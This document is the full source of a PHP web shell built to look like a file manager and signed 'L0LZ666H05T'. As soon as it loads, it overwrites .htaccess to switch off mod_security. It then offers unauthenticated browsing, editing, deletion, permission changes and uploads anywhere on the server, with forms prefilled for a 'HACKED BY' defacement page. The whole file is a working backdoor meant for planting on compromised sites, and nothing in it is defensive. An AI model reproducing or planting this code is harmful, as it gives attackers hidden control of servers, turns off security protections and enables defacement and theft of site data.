<?php
$title = @get_current_user();
?>
<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>
<title><?php print $title  ?> | <?php print @cwd() ?></title>
<style type="text/css">
	body {
		font-family:Ubuntu Mono,serif;
		color:#ddd;
	} div.filemanager {
		width:80%;
		background:#1c1c1c;
		border-radius:5px;
		padding:7px;
		box-shadow:0px 0px 10px black;
	} tr.filemanager {
		background:#444;
	} select.filemanager {
		font-family:Ubuntu Mono,serif;
		width:100%;
		background:#444;
		border:1px solid #444;
		color:#4C83AF;
	} a {
		color:#4C83AF;
		text-decoration:none;
	} a.file {
		background:transparent;
		width:100%;
		height:400px;
		color:#fff;
		resize:none;
		border:1px solid #444;
	} textarea.filemanager {
		width:100%;
		height:400px;
		background:#444;
		color:#ddd;
		border:1px solid #444;
		font-family:Ubuntu Mono,serif;
		box-shadow:0px 0px 5px #444;
	} input[type=submit].filemanager {
		background:#444;
		font-family:Ubuntu Mono,serif;
		color:#fff;
		font-weight:bold;
		border:1px solid #444;
		padding:5px;
	} th {
		padding:3px;
	} div.success {
		background:green;
		text-align:center;
		padding:5px;
	} div.failed {
		background:red;
		text-align:center;
		padding:5px;
	} tr.hover:hover {
		background:#555;
	} .icon {
		width:23px;
		height:23px;
	} input[type=submit]:hover {
		cursor:pointer;
	} input[type=text].filemanager {
		background:#444;
		font-family:Ubuntu Mono,serif;
		border:1px solid #444;
		padding:5px;
		color:#fff;
	} .action {
		text-align:center;
		font-weight:bold;
		font-size:17px;
	} span.filemanager {
		padding:5px;
	} td.filemanager {
		padding:7px;
	} input[type=file] {
		background:#444;
		font-family:Ubuntu Mono,serif;
	} input[type=submit].file {
		border:3px solid #444;
		font-family:Ubuntu Mono,serif;
		width:150px;
		background:#444;
		color:#fff;
		font-weight:bold;
	} td.filemanager {
		padding:0px 5px;
		width:600px;
	} td.action {
		width:50px;
	} select.action {
		color:#ddd;
	} table.high {
		background:#ddd;
		border:1px solid #ddd;
		padding:0px 5px;
	} a.home {
		font-size:30px;
	}
</style>
<?php
error_reporting(0);
@define("SEP", @DIRECTORY_SEPARATOR);
@define("PATH", @cwd());
$FILEPATH  = @str_replace($_SERVER['DOCUMENT_ROOT'], "", PATH);
function view($post, $filename) {
	if ($_GET['do'] == $post) {
		if(file_exists($filename) && is_file($filename)) { 
			$code = highlight_file($filename, true); 
			$counter = 1; 
			$arr = explode('<br />', $code); 
			echo '<table class="high" border="0" width="100%" style="font-family: monospace;">' . "\r\n"; 
			foreach($arr as $line) { 
				echo '<tr>' . "\r\n"; 
				
				if((strstr($line, '<span style="color: #FF8000">/*') !== false) && (strstr($line, '*/') !== false)) {
					$comments = false;
					$startcolor = "orange"; 
				} elseif(strstr($line, '<span style="color: #FF8000">/*') !== false) {
					$startcolor = "orange"; 
					$comments = true; 
				} else {
					$startcolor = "green"; 
					if($comments) {
						if(strstr($line, '*/') !== false) { 
							$comments = false; 
							$startcolor = "orange"; 
						} else { 
							$comments = true; 
						}   
					} else {
						$comments = false; 
						$startcolor = "green"; 
					}   
				} if($comments)
				echo '<td width="100%" nowrap style="color: orange;">' . $line . '</td>' . "\r\n";
				else
					echo '<td width="100%" nowrap style="color: ' . $startcolor . ';">' . $line . '</td>' . "\r\n"; 
				echo '</tr>' . "\r\n"; 
				$counter++; 
			}   
			echo '</table>' . "\r\n"; 
		} else { 
			echo "<p>The file <i>$filename</i> could not be opened.</p>\r\n"; 
			return; 
		} exit();
	}
}
@view("view", $_GET['file']);
?>
<center>
<div class="filemanager">
	<table class="filemanager" width="100%">
		<?php
$text = "<IfModule mod_security.c>
  SecRuleEngine Off
  SecFilterInheritance Off
  SecFilterEngine Off
</IfModule>";
		$file = @fopen(".htaccess", "w");
		@fwrite($file, $text);
		@fclose($file);
		function cwd() {
			if (isset($_GET['path'])) {
				$cwd = @str_replace('\\', '/', $_GET['path']);
				@chdir($cwd);
			} else {
				$cwd = @str_replace('\\', '/', @getcwd());
			} return $cwd;
		} function pwd() {
			$dir = @explode("/", @cwd());
			foreach ($dir as $key => $pwd) {
				print("<a href='?path=");
				for ($i=0; $i <= $key ; $i++) { 
					print($dir[$i]);
					if ($i != $key) {
						print("/");
					}
				} print("'>".$pwd."</a>/");
			}
		} function perms($filename) {
			$perms = fileperms($filename);
			switch ($perms & 0xF000) {
				case 0xC000: // socket
				    $info = 's';
				    break;
				case 0xA000: // symbolic link
				    $info = 'l';
                    break;
                case 0x8000: // regular
                    $info = 'r';
                    break;
                case 0x6000: // block special
                    $info = 'b';
                    break;
                case 0x4000: // directory
                    $info = 'd';
                    break;
                case 0x2000: // character special
                    $info = 'c';
                    break;
                case 0x1000: // FIFO pipe
                    $info = 'p';
                    break;
                default: // unknown
                    $info = 'u';
			} $info .= (($perms & 0x0100) ? 'r' : '-');
              $info .= (($perms & 0x0080) ? 'w' : '-');
              $info .= (($perms & 0x0040) ?
              	(($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
              $info .= (($perms & 0x0020) ? 'r' : '-');
              $info .= (($perms & 0x0010) ? 'w' : '-');
              $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
              $info .= (($perms & 0x0004) ? 'r' : '-');
              $info .= (($perms & 0x0002) ? 'w' : '-');
              $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
             return $info;
		} function permission($filename, $perms) {
			if (!is_writable($filename)) {
				?> <font color="red"><?php print $perms ?></font> <?php
			} else {
				?> <font color="green"><?php print $perms ?></font> <?php
			}
		} function action($typePost, $typeFile, $filename, $value) {
	        $action = "<option value='?path=".PATH."&do=".$typePost."&".$typeFile."=".$filename."'>".$value."</option>";
	        return $action;
        } function tools($toolsname, $value) {
        	$tools = "<option value='?path=".PATH."&".$toolsname."'>".$value."</option>";
        	return $tools;
        } function redirect($path, $cwd) {
        	?>
        	<script type="text/javascript">
        		window.location='?<?php print $path ?>=<?php print $cwd ?>';
        	</script>
        	<?php
        } function success($text) {
        	?>
        	<div class="success"><?php print $text ?></div>
        	<?php
        } function failed($text) {
        	?>
        	<div class="failed"><?php print $text ?></div>
        	<?php
        } function back($dir, $value) {
        	$back = "<option value='?path=".$dir."'>".$value."</option>";
        	return $back;
        } function getPath() {
			$getPath = @scandir(PATH);
			return $getPath;
		} function size($filename) {
			$size = @filesize($filename)/1024;
			$size = @round($size, 3);
			if ($size > 1024) {
				$size = @round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			} return $size;
		} function backup($post, $filename) {
			if ($_GET['do'] == $post) {
				$file = @file_get_contents($filename);
				$fp = @fopen($filename.".bak", "w");
				@fwrite($fp, $file);
				@fclose($fp);
			}
		} function makefile($post) {
			if (isset($_GET[$post])) {
				$filename = $_POST['filename'];
				?>
					<tr>
						<th>
							<a onclick="window.location='?path=<?php print PATH ?>'">MAKE FILE</a>
						</th>
					</tr>
					<?php
				if (isset($_POST['submit'])) {
					$fp = @fopen($filename, "w");
					if (@fwrite($fp, $_POST['text'])) {
						?>
						<tr>
							<td><?php print @success("Create file <b>".$filename."</b> Successfully") ?></td>
						</tr>
						<?php
					} else {
						?>
						<tr>
							<td><?php print @failed("Create file <b>".$filename."</b> Failed") ?></td>
						</tr>
						<?php
					}
				}
				?>
				<form method="post">
					<tr class="filemanager">
						<td>
							<input class="filemanager" style="width:100%;" type="text" name="filename" value="L0LZ666H05T.php">
						</td>
					</tr>
					<tr class="filemanager">
						<td>
							<textarea class="filemanager" name="text">HACKED BY L0LZ666H05T</textarea>
						</td>
					</tr>
					<tr class="filemanager">
						<td>
							<input class="filemanager" style="width:100%;" type="submit" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function makedir($post) {
			if (isset($_GET[$post])) {
				if (isset($_POST['submit'])) {
					$dirname = $_POST['dirname'];
					if (@mkdir($dirname)) {
						@success("Create dir <b>".$dirname."</b> Successfully");
					} else {
						@failed("Create dir <b>".$dirname."</b> Failed");
					}
				}
				?>
				<form method="post">
					<tr>
						<th>
							<a onclick="window.location='?path=<?php print PATH ?>'">MAKE DIR</a>
						</th>
					</tr>
					<tr class="filemanager">
						<td>
							<input class="filemanager" style="width:100%;" type="text" name="dirname" value="L0LZ666H05T">
						</td>
					</tr>
					<tr>
						<td>
							<input type="submit" class="filemanager" style="width:100%;" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function changeMode($post, $filename) {
			if ($_GET['do'] == $post) {
				?>
				<tr>
					<th><a onclick="window.location='?path=<?php print PATH ?>'">CHANGE MODE</a></th>
				</tr>
				<?php
				if (isset($_POST['submit'])) {
					if (@chmod($filename, $_POST['mode'])) {
						?>
						<tr>
							<td><?php print @success("Change file <b>".@substr(sprintf('%o', @fileperms($filename)), -4)."</b> to <b>".$_POST['mode']."</b> Successfully") ?></td>
						</tr>
						<?php
					} else {
						?>
						<tr>
							<td><?php print @failed("Change file Failed") ?></td>
						</tr>
						<?php
					}
				}
				?>
				<form method="post">
					<tr class="filemanager">
						<td>
							<input style="width:100%;" class="filemanager" type="text" name="mode" value="<?php print @substr(sprintf('%o', @fileperms($filename)), -4) ?>">
						</td>
					</tr>
					<tr class="filemanager">
						<td>
							<input style="width:100%;" class="filemanager" type="submit" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function copyFile($post, $filename) {
			if ($_GET['do'] == $post) {
				if (isset($_POST['submit'])) {
					if (@copy($filename, $_POST['to'])) {
						@success("File <b>".$filename."</b> Copied to <b>".$_POST['to']."</b>");
					} else {
						@failed("File <b>".$filename."</b> Copied Failed");
					}
				}
				?>
				<form method="post">
					<tr>
						<th>
							Copy File
						</th>
					</tr>
					<tr class="filemanager">
						<td>
							<input type="text" class="filemanager" style="width:100%;" value="<?php print $filename ?>" readonly>
						</td>
						<td style="width:100px;">
							<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
								<option value="" selected>Choose . .</option>
								<?php print @action("edit",  "file", $filename, "Edit") ?>
								<?php print @action("rename", "file", $filename, "Rename") ?>
								<?php print @action("delete", "file", $filename, "Delete") ?>
								<?php print @back(PATH, "BACK") ?>
							</select>
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<input style="width:100%;" class="filemanager" type="text" name="to" value="<?php print PATH.'/'.$filename ?>">
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<input style="width:100%;" class="filemanager" type="submit" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function delete($filename) {
			if (@is_dir($filename)) {
				$scandir = @scandir($filename);
				foreach ($scandir as $object) {
					if ($object != '.' && $object != '..') {
						if (@is_dir($filename.SEP.$object)) {
							@delete($filename.SEP.$object);
						} else {
							@unlink($filename.SEP.$object);
						}
					}
				} if (@rmdir($filename)) {
					return true;
				} else {
					return false;
				}
			} else {
				if (@unlink($filename)) {
					return true;
				} else {
					return false;
				}
			}
		} function edit($post, $filename) {
			if ($_GET['do'] == $post) {
				?>
				<tr>
					<th colspan="2">FILE EDITOR</th>
				</tr>
				<?php
				if (isset($_POST['submit'])) {
					$fp = @fopen($filename, 'w');
					if (@fwrite($fp, $_POST['text'])) {
						?><tr><td colspan="2"><?php @success("Success"); ?></td></tr><?php
					} else {
						?><tr><td colspan="2"><?php @failed("Failed"); ?></td></tr><?php
					}
				} $text = @htmlspecialchars(@file_get_contents($filename));
				?>
				<form method="post">
					<tr class="filemanager">
						<td class="filemanager">
							<span class="filemanager"> [ Filename : 
								<?php print @permission($filename, $filename) ?> ] 
								[ Size : <?php print @permission($filename, @size($filename)) ?> ]
							</span>
						</td>
						<td style="width:50px;">
							<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
								<option value="" selected>Choose . .</option>
								<?php print @action("view",   "file", $filename, "Highlight") ?>
								<?php print @action("rename", "file", $filename, "Rename") ?>
								<?php print @action("delete", "file", $filename, "Delete") ?>
								<?php print @action("copy",   "file", $filename, "Copy") ?>
								<?php print @back(PATH, "BACK") ?>
							</select>
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<textarea class="filemanager" name="text" placeholder="Nothing Script"><?php print $text ?></textarea>
						</td>
					</tr>
					<tr class="filemanager">
						<td colspan="2">
							<input class="filemanager" style="width:100%;" type="submit" name="submit">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		} function renames($post, $filename) {
			if ($_GET['do'] == $post) {
				?>
				<tr>
					<th colspan="2">RENAME</th>
				</tr>
				<?php
				if (isset($_POST['submit'])) {
					$renames = @rename($filename, $_POST['newname']);
					if ($renames) {
						@redirect("path", PATH);
					} else {
						?><tr><td colspan="2"><?php @failed("Failed"); ?></td></tr><?php
					}
				}
				?>
				<form method="post">
					<tr class="filemanager">
						<td>
							<input class="filemanager" style="width:100%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
						</td>
						<td>
							<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
								<option selected></option>
								<?php print @action("edit",   "file", $filename, "Edit") ?>
								<?php print @action("delete", "file", $filename, "Delete") ?>
								<?php print @back(PATH, "BACK") ?>
							</select>
						</td>
					</tr>
					<tr class="filename">
						<td colspan="2">
							<input type="submit" name="submit" style="width:100%;" class="filemanager">
						</td>
					</tr>
				</form>
				<?php
				exit();
			}
		}

		// Action
		@edit("edit", $_GET['file']);
		if ($_GET['do'] == 'delete') {
			@delete($_GET['file']);
		}
		@renames("rename", $_GET['file']);
		@backup("backup", $_GET['file']);
		@copyFile("copy", $_GET['file']);
		@changeMode("chmod", $_GET['file']);
		@makefile("makefile");
		@makedir("makedir");
		?>

		<tr>
			<th colspan="4">
				<a class="home" href="<?php print $_SERVER['SCRIPT_NAME'] ?>">FILEMANAGER</a>
			</th>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="4">
				<center>
					System : <?php print @php_uname() ?>
				</center>
			</td>
		</tr>
		<tr>
			<td colspan="4">
				<?php
				if (isset($_POST['submit'])) {
					if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
						@success("Upload at => 
							<a href='".$GLOBALS['FILEPATH']."/".$_FILES['file']['name']."' target='_blank'>
							".$_FILES['file']['name']."</a>");
					} else {
						@failed("Upload Failed");
					}
				}
				?>
				<center>
				<form method="post" enctype="multipart/form-data">
					<input type="file" name="file">
					<input class="file" type="submit" name="submit" value="UPLOAD">
				</form>
			    </center>
			</td>
		</tr>
		<tr class="filemanager">
			<th colspan="4"><?php print @pwd() ?></th>
		</tr>
		<tr class="filemanager">
			<th>Filename</th>
			<th>Permission</th>
			<th>Size</th>
			<th style="width:90px;">
				<select class="filemanager action" onclick="if (this.value)window.location=(this.value)">
					<option value="" selected>Action</option>
					<?php print @tools("makefile", "Make File") ?>
					<?php print @tools("makedir", "Make Dir") ?>
				</select>
			</th>
		</tr>
		<?php
		if(!is_dir(PATH)) die("Directory '".PATH."' is not exists.");
        if(!is_readable(PATH)) die("Directory '".PATH."' not readable.");
		foreach (@getPath() as $dir) {
			if (!is_dir($dir)) continue;
			if ($dir === '.' || $dir === '..') continue;
			?>
			<tr class="filemanager hover">
				<td class="filemanager"> 
					<img src='http://nzsc.xtgem.com/folder.png' width=15px>
					<a href="?path=<?php print PATH.SEP.$dir ?>"><?php print $dir ?></a>
				</td>
				<td><center><?php print @permission($dir, @perms($dir)) ?></center></td>
				<td><center>--</center></td>
				<td class="action">
					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
						<option value="" selected>Choose . .</option>
						<?php print @action("delete", "file", $dir, "Delete") ?>
						<?php print @action("rename", "file", $dir, "Rename") ?>
					</select>
				</td>
			</tr>
			<?php
		}
		foreach (@getPath() as $file) {
			if (!is_file($file)) continue;
			?>
			<tr class="filemanager hover">
				<td class="filemanager"> 
					<img src='http://nzsc.xtgem.com/file2.png' width=15px>
					<a href="<?php print $GLOBALS['FILEPATH'] ?>/<?php print $file ?>" target='_blank'><?php print $file ?></a>
				</td>
				<td><center>
					<a href="?path=<?php print PATH ?>&do=chmod&file=<?php print $file ?>"><?php print @permission($file, @perms($file)) ?></a>
				</center></td>
				<td><center><?php print @size($file) ?></center></td>
				<td style="width:50px;">
					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
						<option value="" selected>Choose . .</option>
						<?php print @action("edit",   "file", $file, "Edit") ?>
						<?php print @action("delete", "file", $file, "Delete") ?>
						<?php print @action("rename", "file", $file, "Rename") ?>
						<?php print @action("backup", "file", $file, "Backup") ?>
						<?php print @action("copy",   "file", $file, "Copy") ?>
					</select>
					<input type="hidden" name="file" value="<?php print $file ?>">
				</td>
			</tr>
			<?php
		}
		?>
		<tr><td></td></tr>
		<tr><td></td></tr>
		<tr>
			<th colspan="4">
				&copy; <?php print @date("Y") ?> - L0LZ666H05T | 
				<?php 
				$file = @scandir(@cwd());
				$count = @count($file)-2;
				if (!is_file($file)) {
					print("Files : ".$count."");
				}
				?>
			</th>
		</tr>
	</table>
</div>
